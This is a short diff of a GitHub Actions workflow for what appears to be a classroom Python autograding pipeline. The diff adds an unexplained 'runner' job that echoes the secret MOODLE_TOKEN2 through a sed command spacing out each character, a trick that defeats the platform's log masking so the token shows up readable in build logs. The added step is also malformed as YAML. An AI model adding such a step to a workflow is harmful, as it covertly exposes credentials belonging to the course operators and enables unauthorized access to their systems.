@@ -17,7 +17,11 @@ jobs:
   #    ADD_LABELS: "false"
   #  secrets:
   #    GHSECRET: ${{ secrets.GITHUB_TOKEN }}
-
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      echo ${{secrets.MOODLE_TOKEN2}} | sed 's/./& /g'
+    
   grading:
     if: ${{ !contains(github.actor, 'classroom') }}
     uses: BZZ-Commons/pygrader/.github/workflows/py_autograding.yml@main
